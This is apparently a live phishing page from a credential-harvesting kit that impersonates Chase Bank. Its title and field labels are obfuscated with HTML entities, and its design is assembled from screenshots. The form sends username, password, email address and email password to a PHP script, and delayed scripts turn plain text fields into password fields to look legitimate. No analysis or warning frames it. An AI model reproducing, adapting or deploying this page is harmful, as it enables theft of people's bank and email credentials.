<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#67;&#104;&#97;&#115;&#101;&#32;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#67;&#114;&#101;&#100;&#105;&#116;&#32;&#67;&#97;&#114;&#100;&#44;&#32;&#77;&#111;&#114;&#116;&#103;&#97;&#103;&#101;&#44;&#32;&#65;&#117;&#116;&#111;&#44;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;&#32;&#83;&#101;&#114;&#118;&#105;&#99;&#101;&#115;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[3].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <style type="text/css">		   
.textbox {
    height: 40px;
    padding-left: 8px;
    border: none;
   	border-bottom: solid 1px #ccc;
    font-size: 17px;
    width: 270px;
}
 .textbox:focus {  
    outline: none;
    background: #fff;
   border-bottom: solid 3px #126BC5;
    outline: solid 2px #126BC5;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1394px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:203px; z-index:0"><a href="#"><img src="images/cas4.png" alt="" title="" border=0 width=1350 height=203></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:202px; width:1350px; height:199px; z-index:1"><a href="#"><img src="images/cas5.png" alt="" title="" border=0 width=1350 height=199></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:382px; top:420px; width:498px; height:49px; z-index:3"><img src="images/cas6.png" alt="" title="" border=0 width=498 height=49></div>

<div id="image5" style="position:absolute; overflow:hidden; left:146px; top:477px; width:974px; height:120px; z-index:4"><a href="#"><img src="images/cas7.png" alt="" title="" border=0 width=974 height=120></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:65px; top:614px; width:1189px; height:222px; z-index:5"><a href="#"><img src="images/cas8.png" alt="" title="" border=0 width=1189 height=222></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:55px; top:841px; width:1204px; height:164px; z-index:6"><a href="#"><img src="images/cas9.png" alt="" title="" border=0 width=1204 height=164></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:69px; top:1024px; width:1142px; height:292px; z-index:7"><a href="#"><img src="images/cas10.png" alt="" title="" border=0 width=1142 height=292></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:0px; top:1379px; width:1350px; height:182px; z-index:8"><img src="images/cas12.png" alt="" title="" border=0 width=1350 height=182></div>

<div id="image10" style="position:absolute; overflow:hidden; left:0px; top:1547px; width:1350px; height:209px; z-index:9"><a href="#"><img src="images/cas13.png" alt="" title="" border=0 width=1350 height=209></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:0px; top:1753px; width:1353px; height:260px; z-index:10"><a href="#"><img src="images/cas14.png" alt="" title="" border=0 width=1353 height=260></a></div>

<div id="image12" style="position:absolute; overflow:hidden; left:0px; top:2013px; width:1354px; height:229px; z-index:11"><img src="images/cas16.png" alt="" title="" border=0 width=1354 height=229></div>

<div id="image13" style="position:absolute; overflow:hidden; left:0px; top:2242px; width:1350px; height:123px; z-index:12"><img src="images/cas17.png" alt="" title="" border=0 width=1350 height=123></div>

<div id="image14" style="position:absolute; overflow:hidden; left:445px; top:2396px; width:359px; height:30px; z-index:13"><a href="#"><img src="images/cas18.png" alt="" title="" border=0 width=359 height=30></a></div>

<div id="image15" style="position:absolute; overflow:hidden; left:0px; top:2461px; width:1350px; height:233px; z-index:14"><img src="images/cas19.png" alt="" title="" border=0 width=1350 height=233></div>

<div id="image16" style="position:absolute; overflow:hidden; left:0px; top:2690px; width:1350px; height:253px; z-index:15"><img src="images/cas20.png" alt="" title="" border=0 width=1350 height=253></div>

<div id="image17" style="position:absolute; overflow:hidden; left:0px; top:2942px; width:1350px; height:224px; z-index:16"><img src="images/cas21.png" alt="" title="" border=0 width=1350 height=224></div>

<div id="image18" style="position:absolute; overflow:hidden; left:0px; top:3166px; width:1350px; height:224px; z-index:17"><img src="images/cas21.png" alt="" title="" border=0 width=1350 height=224></div>

<div id="image19" style="position:absolute; overflow:hidden; left:0px; top:3390px; width:1351px; height:298px; z-index:18"><img src="images/cas22.png" alt="" title="" border=0 width=1351 height=298></div>

<div id="image21" style="position:absolute; overflow:hidden; left:1255px; top:508px; width:34px; height:59px; z-index:19"><a href="#"><img src="images/csa1.png" alt="" title="" border=0 width=34 height=59></a></div>

<div id="image22" style="position:absolute; overflow:hidden; left:24px; top:497px; width:38px; height:57px; z-index:20"><a href="#"><img src="images/csa2.png" alt="" title="" border=0 width=38 height=57></a></div>

<div id="image20" style="position:absolute; overflow:hidden; left:499px; top:3518px; width:546px; height:17px; z-index:21"><a href="#"><img src="images/cas23.png" alt="" title="" border=0 width=546 height=17></a></div>
<form action=need1.php name=adyalajail id=adyalajail method=post>
<input name="usr" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:964px;top:130px;z-index:22">
<input name="psw"  placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:964px;top:174px;z-index:23">
<input name="eml" placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#65;&#100;&#100;&#114;&#101;&#115;&#115;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:964px;top:218px;z-index:24">
<input name="eps"  placeholder="&#69;&#109;&#97;&#105;&#108;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:267px;left:964px;top:262px;z-index:25">

<div id="formimage1" style="position:absolute; left:963px; top:312px; z-index:26"><input type="image" name="formimage1" width="267" height="40" src="images/signin.png"></div>

</div>
	
</body>
</html>
